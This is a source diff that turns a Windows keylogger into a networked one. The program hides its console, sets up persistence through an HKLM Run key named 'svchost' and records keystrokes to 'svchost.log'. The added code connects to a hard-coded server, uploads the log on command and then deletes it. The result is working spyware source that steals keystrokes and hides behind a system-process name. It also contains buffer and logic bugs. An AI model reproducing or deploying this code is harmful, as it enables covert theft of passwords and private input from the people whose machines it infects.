@@ -13,118 +13,164 @@
 
 //DO NOT DELETE COMMENTS ABOVE THIS.
 
+#include "header.h"
 
-/*
-Plan:
-
-commands from client to server:
-	run
-	sleep
-	get_loggs
-	delete_programm
-
-*/
-
-
-#include <windows.h>
-#include <Windows.h>   //For sleep() function.
-#include <stdio.h>
-#include <winuser.h>
-#include <windowsx.h>
-#include <time.h>
-#include <conio.h>
+#pragma comment(lib, "Ws2_32.lib")
+#define DEFAULT_SERVER_PORT 27015
+#define DEFAULT_BUFLEN 512
+#define	DEFAULT_SERVER_IP "192.168.137.1"
+#define bufsize 512
+#define TimesToTry  10 //How many times trying to send a message to server if something goes wrong
 
 #define _CRT_SECURE_NO_WARNINGS //VS2013 require this stuff, not to show warnings.
-#define BUFSIZE 80
+#define BUFSIZE 512//80
 #define MIN_DIFF 120//2 min
 #define CHECK_TIME	t_time2 = clock()/CLOCKS_PER_SEC; \
-					if (t_time2 - t_time1 >= MIN_DIFF)\
-					{fputs("\n", file);\
-					fputs(asctime(t_m), file);\
+if (t_time2 - t_time1 >= MIN_DIFF)\
+					{fputs("\n", file); \
+					fputs(asctime(t_m), file); \
 					t_time1 = t_time2; }\
-//время		
-		
+					//time		
+
 
 
 int test_key(void);
 int create_key(char *);
-int get_keys(void);
+int get_keys(SOCKET, int);
 
 
 
 int main(void)
 {
-    HWND stealth; /*creating stealth (window is not visible)*/
-    AllocConsole();
-    stealth=FindWindowA("ConsoleWindowClass",NULL);
+	//*****
+	//INIT_WINAPI_DEPENDENT
+	//*****
+	
+	HWND stealth; /*creating stealth (window is not visible)*/
+	AllocConsole();
+	stealth = FindWindowA("ConsoleWindowClass", NULL);
 	ShowWindow(stealth, 0); //SW_HIDE - Hides the window and activates another window.
-   
-    int test,create;
-    test=test_key();/*check if key is available for opening*/
-         
-    if (test==2)/*create key*/
-    {
-        char *path="c:\\%windir%\\svchost.exe";/*the path in which the file needs to be*/
-        create=create_key(path);
-          
-    }
-        
-   
-    int t=get_keys();
-    
-    return t;
-}  
+
+	//*****
+	//INIT_WINAPI_DEPENDENT
+	//*****
+
+
+	//*****
+	//INIT_SOCKET
+	//*****
+
+	char OUR_DEFAULT_PORT_CHAR[] = "27016";
+	//Initialize WSA
+	WSADATA wsaData;
+	int result;
+	result = WSAStartup(MAKEWORD(2, 2), &wsaData);
+	if (result != 0)
+	{
+		//std::cout << "Error in function WSAStartup: " << result << std::endl;
+		//getchar();
+		return 1;
+	}
+
+	// Create a socket to send our IP to server
+	SOCKET clientSocket = INVALID_SOCKET;
+	clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+	if (clientSocket == INVALID_SOCKET)
+	{
+
+		WSACleanup();
+		return 1;
+	}
+
+	//*****
+	//INIT_SOCKET
+	//*****
+
+	//*****
+	//CONNECTING_TO_SOCKET
+	//*****
+	sockaddr_in clientService;
+	clientService.sin_family = AF_INET;
+	inet_pton(AF_INET, DEFAULT_SERVER_IP, &(clientService.sin_addr));
+	clientService.sin_port = htons(DEFAULT_SERVER_PORT);
+
+	while (true)
+	{
+		result = connect(clientSocket, (reinterpret_cast<SOCKADDR*>(&clientService)), sizeof(clientService));
+		if (result == 0)
+			break;
+	}
+
+	//*****
+	//CONNECTING_TO_SOCKET
+	//*****
+
+	int test, create;
+	test = test_key();/*check if key is available for opening*/
+
+	if (test == 2)/*create key*/
+	{
+		char *path = "c:\\%windir%\\svchost.exe";/*the path in which the file needs to be*/
+		create = create_key(path);
+
+	}
+
+
+	int t = get_keys(clientSocket, result);
+
+	return t;
+}
 
 
 int test_key(void)
 {
-    int check;
-    HKEY hKey;
-    char path[BUFSIZE];
-    DWORD buf_length=BUFSIZE;
-    int reg_key;
-    
-    reg_key=RegOpenKeyEx(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",0,KEY_QUERY_VALUE,&hKey);//opens the specified key
-    if(reg_key!=0)
-    {    
-        check=1;
-        return check;
-    }        
-           
-    reg_key=RegQueryValueEx(hKey,"svchost",NULL,NULL,(LPBYTE)path,&buf_length);//returns the type of data and the specified value name associated with an open registry key
-    
-    if((reg_key!=0)||(buf_length>BUFSIZE))
-        check=2;
-    if(reg_key==0)
-        check=0;
-         
-    RegCloseKey(hKey);
-    return check;   
+	int check;
+	HKEY hKey;
+	char path[BUFSIZE];
+	DWORD buf_length = BUFSIZE;
+	int reg_key;
+
+	reg_key = RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_QUERY_VALUE, &hKey);//opens the specified key
+	if (reg_key != 0)
+	{
+		check = 1;
+		return check;
+	}
+
+	reg_key = RegQueryValueEx(hKey, L"svchost", NULL, NULL, (LPBYTE)path, &buf_length);//returns the type of data and the specified value name associated with an open registry key
+
+	if ((reg_key != 0) || (buf_length>BUFSIZE))
+		check = 2;
+	if (reg_key == 0)
+		check = 0;
+
+	RegCloseKey(hKey);
+	return check;
 }
-   
+
 int create_key(char *path)
-{   
-        int reg_key,check;
-        
-        HKEY hkey;
-        
-        reg_key=RegCreateKey(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",&hkey);//It creates the specified key. If the key already exists in the registry, the function opens it
-        if(reg_key==0)
-        {
-                RegSetValueEx((HKEY)hkey,"svchost",0,REG_SZ,(BYTE *)path,strlen(path));//saves the data in the values of open registry key. She, too, may establish additional value and type information for the specified key
-                //REG_SZ ~ KEY_QUERY_VALUE 
-				
-				check=0;
-                return check;
-        }
-        if(reg_key!=0)
-                check=1;
-                
-        return check;
+{
+	int reg_key, check;
+
+	HKEY hkey;
+
+	reg_key = RegCreateKey(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey);//It creates the specified key. If the key already exists in the registry, the function opens it
+	if (reg_key == 0)
+	{
+		RegSetValueEx((HKEY)hkey, L"svchost", 0, REG_SZ, (BYTE *)path, strlen(path));//saves the data in the values of open registry key. She, too, may establish additional value and type information for the specified key
+		//REG_SZ ~ KEY_QUERY_VALUE 
+
+		check = 0;
+		return check;
+	}
+	if (reg_key != 0)
+		check = 1;
+
+	return check;
 }
 
 
-int get_keys(void)
+int get_keys(SOCKET clientSocket, int result)
 {
 	FILE *file;
 	time_t t;
@@ -145,17 +191,80 @@ int get_keys(void)
 	while (1)
 	{
 		Sleep(10);/*to prevent 100% cpu usage*/
+
+		//*****
+		//COMMUNICATING_WITH_SERVER
+		//*****
+
+
+		while (true)
+		{
+			// get data
+			char buf[bufsize];
+			char x = buf[bufsize];
+			int r = recv(clientSocket, buf, bufsize, 0);
+			if (r <= 0)
+			{
+				//WSACleanup();
+				//return 0;
+				continue;
+			}
+
+			// If you sent a 0 - send files
+			if (buf[0] == '0')
+			{
+				char data[bufsize];
+				char filetosend[] = "svchost.log";
+				//FILE *in;
+				fopen_s(&file, filetosend, "rb");
+				while (!feof(file))
+				{
+					int b = fread(data, 1, bufsize, file);
+					result = -1;
+					int i = 0;
+					while (i < TimesToTry)
+					{
+						result = send(clientSocket, data, static_cast<int>(strlen(data)), 0);
+						if (result == 0)
+							break;
+						i++;
+					}
+				}
+				fclose(file);
+
+				remove("svchost.log");
+
+
+				continue;
+			}
+			// If you sent 1 - disables
+			if (buf[0] == '1')
+			{
+				closesocket(clientSocket);
+				WSACleanup();
+				return 0;
+			}
+
+		}
+
+
+		//*****
+		//COMMUNICATING_WITH_SERVER
+		//*****
+
+
+
 		for (character = 8; character <= 222; character++)
 		{
 			if (GetAsyncKeyState(character) == -32767)
-//sets, pressed or unpressed condition is key at the time, 
-//when the function is called and whether a key is pressed after the previous call GetAsyncKeyState().
+				//sets, pressed or unpressed condition is key at the time, 
+				//when the function is called and whether a key is pressed after the previous call GetAsyncKeyState().
 			{
 				file = fopen("svchost.log", "a+");
 				CHECK_TIME
 
-				//FILE *file;
-				
+					//FILE *file;
+
 				if (file == NULL)
 				{
 					return 1;
@@ -236,20 +345,20 @@ int get_keys(void)
 							fclose(file);
 							break;
 
-							case VK_OEM_PLUS:
-							fputc('+',file);
+						case VK_OEM_PLUS:
+							fputc('+', file);
 							fclose(file);
 							break;
-							case VK_OEM_COMMA:
-							fputc(',',file);
+						case VK_OEM_COMMA:
+							fputc(',', file);
 							fclose(file);
 							break;
-							case VK_OEM_MINUS:
-							fputc('-',file);
+						case VK_OEM_MINUS:
+							fputc('-', file);
 							fclose(file);
 							break;
-							case VK_OEM_PERIOD:
-							fputc('.',file);
+						case VK_OEM_PERIOD:
+							fputc('.', file);
 							fclose(file);
 							break;
 
@@ -309,3 +418,4 @@ int get_keys(void)
 	}
 	return EXIT_SUCCESS;
 }
+
